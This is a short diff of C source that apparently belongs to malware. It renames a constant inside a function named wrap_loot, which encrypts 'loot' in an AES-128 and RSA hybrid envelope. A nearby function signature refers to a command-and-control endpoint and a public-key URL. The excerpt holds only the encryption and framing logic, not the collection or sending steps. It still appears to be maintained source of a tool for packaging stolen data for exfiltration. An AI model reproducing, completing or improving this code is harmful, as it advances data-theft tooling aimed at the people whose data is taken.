@@ -102,12 +102,12 @@ static int from_past(const char *content, char *pubkey_url, char *c2_endpoint) {
 /* Hybrid crypto AES-128-CBC + RSA envelope */
 static unsigned char* wrap_loot(const unsigned char *plaintext, size_t plaintext_len,
                                 size_t *out_len, RSA *rsa_pubkey) {
-    unsigned char aes_key[16], iv[IV_SIZE];
+    unsigned char aes_key[16], iv[IV_SZ];
     if (!RAND_bytes(aes_key, sizeof(aes_key)) ||
-        !RAND_bytes(iv, IV_SIZE))
+        !RAND_bytes(iv, IV_SZ))
         return NULL;
 
-    int max_ct = plaintext_len + IV_SIZE;
+    int max_ct = plaintext_len + IV_SZ;
     unsigned char *ciphertext = malloc(max_ct);
     if (!ciphertext) return NULL;
 
@@ -149,7 +149,7 @@ static unsigned char* wrap_loot(const unsigned char *plaintext, size_t plaintext
         return NULL;
     }
 
-    *out_len = 4 + ek_len + IV_SIZE + 4 + ciphertext_len;
+    *out_len = 4 + ek_len + IV_SZ + 4 + ciphertext_len;
     unsigned char *message = malloc(*out_len);
     if (!message) {
         free(encrypted_key);
@@ -164,7 +164,7 @@ static unsigned char* wrap_loot(const unsigned char *plaintext, size_t plaintext
     memcpy(p, encrypted_key, ek_len); p += ek_len;
     free(encrypted_key);
 
-    memcpy(p, iv, IV_SIZE); p += IV_SIZE;
+    memcpy(p, iv, IV_SZ); p += IV_SZ;
     net = htonl(ciphertext_len);
     memcpy(p, &net, 4); p += 4;
     memcpy(p, ciphertext, ciphertext_len);
